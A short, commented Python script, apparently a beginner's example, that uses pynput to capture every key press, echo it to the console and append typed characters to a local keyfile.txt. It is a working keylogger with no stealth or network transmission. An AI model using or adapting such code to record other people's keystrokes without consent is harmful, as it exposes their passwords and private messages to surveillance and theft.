
from pynput import keyboard # Importing the 'keyboard' module from the 'pynput' package


def keyPressed(key):
    print(str(key)) # Printing the key that was pressed
    with open("keyfile.txt", 'a') as logKey: # Opening a file named "keyfile.txt" in append mode
        try:
            char = key.char  # Retrieving the character representation of the key
            logKey.write(char)  # Writing the character to the file
        except:
            print("Error getting char")  # Handling any errors that occur while getting the character


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)   #Creating a listener object that will call 'keyPressed' function when a key is pressed
    listener.start() # Starting the listener to monitor for key presses
    input()  # Waiting for user input (this line ensures the program continues running until the user presses Enter)
